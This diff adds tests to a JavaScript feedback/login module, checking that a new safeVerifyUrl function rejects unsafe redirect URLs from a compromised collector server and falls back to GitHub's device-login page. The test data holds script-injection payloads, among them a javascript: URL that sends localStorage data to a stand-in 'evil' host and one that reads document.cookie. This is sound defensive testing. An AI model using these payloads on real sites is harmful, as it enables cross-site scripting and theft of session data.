@@ -17,7 +17,7 @@
 import http from 'node:http'
 import assert from 'node:assert/strict'
 import fs from 'node:fs'
-import { createFeedback, feedbackBaseOf } from '../src/feed.js'
+import { createFeedback, feedbackBaseOf, safeVerifyUrl } from '../src/feed.js'
 import { createApiRoutes } from '../index.js'
 
 let failures = 0
@@ -32,6 +32,8 @@ const check = async (name, fn) => {
 const received = []
 let pollReply = { status: 'pending' }
 let submitReply = { status: 200, body: { id: 'fb-1' } }
+/** When set, the next `/api/auth/start` answers this instead of the normal body. */
+let startReply
 const stub = http.createServer((req, res) => {
   const send = (code, payload) => { res.writeHead(code, { 'content-type': 'application/json' }); res.end(JSON.stringify(payload)) }
   let raw = ''
@@ -41,6 +43,7 @@ const stub = http.createServer((req, res) => {
     const forwarded = req.url.startsWith('/feedback/') ? req.url.slice('/feedback'.length) : req.url
     received.push({ url: req.url, forwarded, headers: req.headers, body })
     if (forwarded === '/api/auth/start') {
+      if (startReply !== undefined) return send(200, startReply)
       return send(200, { session: 'sess-1', userCode: 'WXYZ-9876', verifyUrl: 'https://github.com/login/device', expiresIn: 900 })
     }
     if (forwarded === '/api/auth/poll') return send(200, pollReply)
@@ -88,6 +91,40 @@ try {
     assert.equal(value.session, 'sess-1')
     const call = received.find(row => row.forwarded === '/api/auth/start')
     assert.equal(call.url, '/feedback/api/auth/start')
+  })
+
+  // verifyUrl 直接进 href 与 window.open，是"页面将要跳转"的地址。收集端回
+  // 什么协议都必须在这里拦住，否则一个被攻破的收集端就能让用户在持有管理
+  // 会话的同源里执行脚本。
+  await check('verifyUrl 只放行 https（本机收集端另允许 loopback http）', () => {
+    assert.equal(safeVerifyUrl('https://github.com/login/device'), 'https://github.com/login/device')
+    assert.equal(safeVerifyUrl('http://127.0.0.1:8080/login'), 'http://127.0.0.1:8080/login')
+    for (const hostile of [
+      'javascript:fetch("//evil/"+localStorage.ofm)',
+      'JavaScript:alert(1)',
+      'data:text/html,<script>alert(1)</script>',
+      'vbscript:msgbox(1)',
+      'file:///C:/Windows/System32/drivers/etc/hosts',
+      'http://example.com/login',
+      'https://u:p@example.com/login',
+      '',
+      null,
+      42,
+      `https://example.com/${'a'.repeat(3000)}`,
+    ]) {
+      assert.equal(safeVerifyUrl(hostile), 'https://github.com/login/device', `must reject ${String(hostile).slice(0, 40)}`)
+    }
+  })
+
+  await check('start 把收集端的恶意 verifyUrl 换成官方验证页', async () => {
+    startReply = { session: 'sess-2', userCode: 'ABCD-1234', verifyUrl: 'javascript:alert(document.cookie)', expiresIn: 900 }
+    try {
+      const value = await feedback.start()
+      assert.equal(value.verifyUrl, 'https://github.com/login/device')
+      assert.equal(value.userCode, 'ABCD-1234', '登录仍要继续：验证码才是用户唯一能用的东西')
+    } finally {
+      startReply = undefined
+    }
   })
 
   await check('轮询 pending 时不落令牌', async () => {
